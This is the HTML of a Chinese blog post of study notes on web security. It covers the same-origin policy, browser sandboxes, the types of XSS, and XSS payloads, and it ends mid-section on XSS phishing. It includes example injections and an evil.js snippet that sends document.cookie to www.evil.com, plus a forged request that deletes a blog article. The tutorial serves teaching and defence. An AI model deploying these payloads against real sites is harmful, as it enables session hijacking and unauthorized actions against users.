@@ -1,0 +1,1637 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="本文介绍web安全的相关知识 浏览器安全、xss未复习，csrf已复习">
+<meta name="keywords" content="web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全">
+<meta property="og:url" content="http://yoursite.com/2019/10/13/白帽子讲Web安全/index.html">
+<meta property="og:site_name" content="小光的博客">
+<meta property="og:description" content="本文介绍web安全的相关知识 浏览器安全、xss未复习，csrf已复习">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c4907e7845a420cb4fe41a48ba515ce~tplv-k3u1fbpfcp-zoom-1.image">
+<meta property="og:updated_time" content="2020-11-11T12:29:55.213Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全">
+<meta name="twitter:description" content="本文介绍web安全的相关知识 浏览器安全、xss未复习，csrf已复习">
+<meta name="twitter:image" content="http://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c4907e7845a420cb4fe41a48ba515ce~tplv-k3u1fbpfcp-zoom-1.image">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/13/白帽子讲Web安全/">
+
+
+
+
+
+  <title>Web安全 | 小光的博客</title>
+  
+
+
+
+
+
+
+
+
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+  <script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?bacbd4424722e498fac9ea507f3a8807";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+  window.onload=function(){
+    if (!sessionStorage.getItem('homePgCount')) {
+      sessionStorage.setItem('homePgCount', Math.floor(new Date().getSeconds() % 11));
+    }
+    $('.header-inner').css("backgroundImage", 'url("https://mfaying.github.io/images/bg' + (sessionStorage.getItem('homePgCount') || 0) + '.jpg")')
+    $('.blur-bg').css("backgroundImage", 'url("https://mfaying.github.io/images/bg' + (sessionStorage.getItem('homePgCount') || 0) + '.jpg")')
+  }
+
+  </script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  <div class="blur-bg"></div>
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">小光的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/13/白帽子讲Web安全/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="小光">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小光的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-13T12:24:04+08:00">
+                2019-10-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/10/13/白帽子讲Web安全/" class="leancloud_visitors" data-flag-title="Web安全">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>本文介绍web安全的相关知识</p>
+<h1 id="浏览器安全、xss未复习，csrf已复习"><a href="#浏览器安全、xss未复习，csrf已复习" class="headerlink" title="浏览器安全、xss未复习，csrf已复习"></a>浏览器安全、xss未复习，csrf已复习</h1><a id="more"></a>
+<p><img src="//p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c4907e7845a420cb4fe41a48ba515ce~tplv-k3u1fbpfcp-zoom-1.image" alt="前端阅读室"></p>
+<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是浏览器最核心也是最基本的安全功能。</p>
+<p>同源意味着协议、host（域名或IP地址，如果是IP地址则看作一个根域名）、端口号相同。</p>
+<p>浏览器的同源策略，限制了来自不同源的”document”或脚本，对当前”document”读取或设置某些属性。</p>
+<p>script、img、iframe、link等标签都可以跨域加载资源，而不受同源策略的限制。这些带”src”属性的标签每次加载时实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。XMLHttpRequest受到同源策略的约束，不能跨域访问资源。</p>
+<p>但是互联网是开放的，跨域请求的需求也越来越迫切，因此W3C委员会制定了XMLHttpRequest跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的。</p>
+<p>跨域访问请求过程</p>
+<p>index.html -&gt; Origin -&gt; index.php<br>index.php -&gt; Access-Control-Allow-Origin -&gt; index.html</p>
+<p>对于浏览器来说，除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。如Flash、Java、Applet、Silverlight、Google Gears等都有自己的控制策略。</p>
+<p>以Flash为例，它主要通过目标网站提供的crossdomain.xml文件判断是否允许当前”源”的Flash跨域访问目标资源。</p>
+<p>如<a href="http://www.qq.com/crossdomain.xml" target="_blank" rel="noopener">www.qq.com/crossdomain.xml</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.qq.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.gtimg.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只有来自<em>.qq.com和</em>.gtimg.com域的请求是被允许的。</p>
+<p>在Flash9及之后的版本中，还实现了MIME检查以确认crossdomain.xml是否合法，比如查看服务器返回HTTP头的Content-Type是否是text/*、application/xml、application/xhtml+xml。这样做的原因，是因为攻击者可以通过上传crossdomain.xml文件控制Flash的行为，绕过同源策略。除了MIME检查外，Flash还会检查crossdomain.xml是否在根目录下，也可以使得一些上传文件的攻击失效。</p>
+<p>然而，一些浏览器的同源策略也曾被绕过，比如这个IE8的CSS漏洞</p>
+<p><a href="http://www.a.com/test.html" target="_blank" rel="noopener">www.a.com/test.html</a>:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  &#123;&#125;body&#123;font-family:</span><br><span class="line">  aaaaaaaaaaaa</span><br><span class="line">  bbbbbbbbbbbbbbbbbbb</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a href="http://www.b.com/test2.html" target="_blank" rel="noopener">www.b.com/test2.html</a>:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="keyword">@import</span> url(<span class="string">"http://www.a.com/test.html"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> t = <span class="built_in">document</span>.body.currentStyle.fontFamily;</span></span><br><span class="line">    alert(t);</span><br><span class="line">  &#125;, 2000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在<a href="http://www.b.com/test2.html中通过@import加载了http://www.a.com/test.html" target="_blank" rel="noopener">www.b.com/test2.html中通过@import加载了http://www.a.com/test.html</a> 为CSS文件，渲染进入当前页面DOM，同时通过document.body.currentStyle.fontFamily 访问此内容。问题发生在IE的CSS Parse的过程中，IE将fontFamily后面的内容当做了value，从而可以读取<a href="http://www.a.com/test.html的页面内容。会弹出" target="_blank" rel="noopener">www.a.com/test.html的页面内容。会弹出</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  aaaaaaaaaaaa</span><br><span class="line">  bbbbbbbbbbbbbbbbbbb</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>我们前面提到，script等标签仅能加载资源，但不能读、写资源的内容，而这个漏洞能够跨域读取页面内容，因此绕过了同源策略，成为一个跨域漏洞。</p>
+<h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><p>在网页中插入一段恶意代码，利用浏览器漏洞执行代码，在用户电脑中植入木马，称为”挂马”。</p>
+<p>Sandbox即沙箱，泛指”资源隔离类模块”的代名词。其设计的目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任代码访问隔离区之外的资源。如果一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道。比如经过封装的API来完成，在这些API中会严格检查请求的合法性。</p>
+<p>浏览器大多采用多进程架构，各个功能模块分开，各个浏览器实例分开。当一个进程崩溃时，不会影响到其他进程。如Google渲染进程由Sandbox隔离，网页代码与浏览器内核进程、操作系统进行通信都需要通过IPC channel，在其中会进行一些安全检查。</p>
+<p>采用Sandbox技术，可以让不信任的网页代码、JavaScript代码运行在一个受到限制的环境中，从而保护本地桌面系统的安全。</p>
+<p>但是浏览器安全是一个整体，浏览器所加载的一些第三方插件却往往不受Sandbox管辖，比如Flash、Java、PDF、.Net Framework都是浏览器攻击的热点。</p>
+<h2 id="恶意网址拦截"><a href="#恶意网址拦截" class="headerlink" title="恶意网址拦截"></a>恶意网址拦截</h2><p>目前各个浏览器的恶意网址拦截功能都是基于”黑名单”的。一般浏览器周期性地从服务器端获取一份最新的恶意网址黑名单。如果用户上网时访问的网址存在于此黑名单中，浏览器就会弹出一个警告页面。</p>
+<p>常见的恶意网址分为两类：一类是挂马网站，另一类是钓鱼网站，通过模仿知名网站的相似页面来欺骗用户。</p>
+<p>除了恶意网址黑名单拦截功能，主流浏览器都开始支持EV SSL证书，其主要特色是浏览器会给予EV SSL证书特殊待遇，如在地址栏特别标注。</p>
+<h2 id="高速发展的浏览器安全"><a href="#高速发展的浏览器安全" class="headerlink" title="高速发展的浏览器安全"></a>高速发展的浏览器安全</h2><p>IE8推出的XSS Filter功能。当用户访问的URL中包含了XSS攻击的脚本时，IE会修改其中的关键字符使得攻击无效，并对用户弹出提示框。</p>
+<p>Firefox4推出的CSP，由服务器返回一个HTTP头，并在其中描述页面应该遵循的安全策略。</p>
+<p>浏览器的拓展与插件也会带来安全问题，除了插件可能存在漏洞外，插件其本身也可能存在恶意行为。</p>
+<h1 id="跨站脚本攻击-XSS-详解"><a href="#跨站脚本攻击-XSS-详解" class="headerlink" title="跨站脚本攻击(XSS)详解"></a>跨站脚本攻击(XSS)详解</h1><h2 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h2><p>XSS（Cross Site Script）攻击，通常指黑客通过”HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p>
+<p>一开始，这种攻击的演示案例是跨域的，所以叫做”跨站脚本”。现在是否跨域已经不再重要，但是名字一直沿用下来。</p>
+<p>XSS长期以来被列为客户端Web安全中的头号大敌。因为XSS破坏力强大，且产生的场景复杂，难以一次性解决。</p>
+<p>下面举个XSS的例子</p>
+<p>假如用户把页面输入的参数直接输出到页面上：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">"param"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;div&gt;"</span>.$input.<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果用户提交了一段HTML代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/test.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>alert(/xss/)就会在页面中执行，弹出框显示/xss/。</p>
+<p>这个例子就是XSS的一种：反射型XSS。</p>
+<p>根据效果的不同，XSS可以分为三类</p>
+<ol>
+<li>反射型XSS</li>
+</ol>
+<p>反射型XSS只是简单地把用户输入的数据”反射“给浏览器。也就是说黑客往往需要诱使用户”点击“一个恶意链接，才能攻击成功。反射型XSS也叫”非持久型XSS”。</p>
+<ol start="2">
+<li>存储型XSS</li>
+</ol>
+<p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。</p>
+<p>比较常见的，黑客写下一篇包含恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意脚本保存在了服务端，这种XSS攻击就叫做“存储型XSS”。存储型XSS也叫做“持久型XSS”。</p>
+<ol start="3">
+<li>DOM Based XSS</li>
+</ol>
+<p>DOM Based XSS从效果上来说也是反射型XSS，单独划分出来是因为它的形成原因比较特殊，发现它的安全专家提出了这种类型的XSS。出于历史原因把它单独作为一个分类了。</p>
+<p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
+<p>下面举个例子</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">'text'</span>).value;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'t'</span>).innerHTML = <span class="string">"&lt;a href='"</span> + str + <span class="string">"' &gt;testLink&lt;/a&gt;"</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"t"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输入框构造如下数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(/xss/) //</span><br></pre></td></tr></table></figure>
+<p>它先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符“//”注释掉第二个引号。<br>输入后，页面代码变成了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"alert(/xss/)"</span> '&gt;</span>testLink<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>点击新生成的这个链接，脚本将被执行。</p>
+<p>其实这里还有另外一种利用方式，还可以选择闭合掉<code>&lt;a&gt;</code>标签，并插入一个新的HTML标签。尝试如下输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;&apos;</span><br></pre></td></tr></table></figure>
+<p>页面代码变成了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">"alert(/xss2/)"</span>&gt;</span><span class="tag">&lt;<span class="name">''</span>&gt;</span></span><br><span class="line">  testLink</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>脚本直接被执行，弹出/xss2/。</p>
+<h2 id="XSS攻击进阶"><a href="#XSS攻击进阶" class="headerlink" title="XSS攻击进阶"></a>XSS攻击进阶</h2><h2 id="初识XSS-Payload"><a href="#初识XSS-Payload" class="headerlink" title="初识XSS Payload"></a>初识XSS Payload</h2><p>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为”XSS Payload”。</p>
+<p>XSS Payload实际上就是JavaScript脚本(还可以是Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到。</p>
+<p>一个最常见的XSS Payload，就是通过读取浏览器对象，从而发起“Cookie劫持”攻击。</p>
+<p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。也就是，你可以在不知道密码的情况下直接登录用户账户。</p>
+<p>下面举个例子，攻击者先加载一个远程脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.html?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>真正的XSS Payload写在这个脚本中，避免直接在URL参数中写入大量的JavaScript代码。</p>
+<p>evil.js代码如下,它将document.cookie对象发送到了远端服务器</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://www.evil.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<p>Cookie的”HttpOnly”标识可以防止“Cookie劫持”，我们将在稍后具体介绍。</p>
+<h2 id="强大的XSS-Payload"><a href="#强大的XSS-Payload" class="headerlink" title="强大的XSS Payload"></a>强大的XSS Payload</h2><p>“Cookie劫持”并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly标识；有的网站可能会把Cookie与客户端IP绑定。尽管如此，攻击者还是有很多方式能够控制用户的浏览器。</p>
+<h3 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h3><p>假设有篇博客所在域的某页面存在XSS漏洞，正常删除文章的链接是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.com/article?m=delete&amp;id=123</span><br></pre></td></tr></table></figure>
+<p>那么攻击者只需要知道文章的id,皆可以通过这个请求删除这篇文章了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://blog.com/article?m=delete&amp;id=123'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+<p>攻击者只需要让博客作者执行这段JavaScript代码(XSS Payload),就会把这篇文章删除。</p>
+<p>对于POST请求，可以这样实现</p>
+<p>第一个种方法</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">f.action = <span class="string">""</span>;</span><br><span class="line">f.method = <span class="string">"post"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i1 = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</span><br><span class="line">i1.name = <span class="string">'name'</span>;</span><br><span class="line">i1.value = <span class="string">'value'</span>;</span><br><span class="line">f.appendChild(i1);</span><br><span class="line"></span><br><span class="line">f.submit();</span><br></pre></td></tr></table></figure>
+<p>如果参数很多，通过构造DOM节点的方式，代码将十分冗长。可以通过innerHTML直接写html字符串的方式构造。</p>
+<p>第二种方法可以使用XMLHttpRequest直接发送一个POST请求。</p>
+<h3 id="XSS钓鱼"><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h3><p>前面介绍的，XSS的攻击过程都是在浏览器中通过JavaScript脚本自动进行的，也就是说，缺少“与用户交互”的过程。</p>
+<p>比如之前“通过POST表单发消息”的例子，如果要求用户输入验证码，那么一般的XSS Payload都会失效。此外，在大多数“修改用户密码”的功能中，都会要求用户输入原密码，而攻击者往往是不知道的。</p>
+<p>但这也不能限制住XSS。</p>
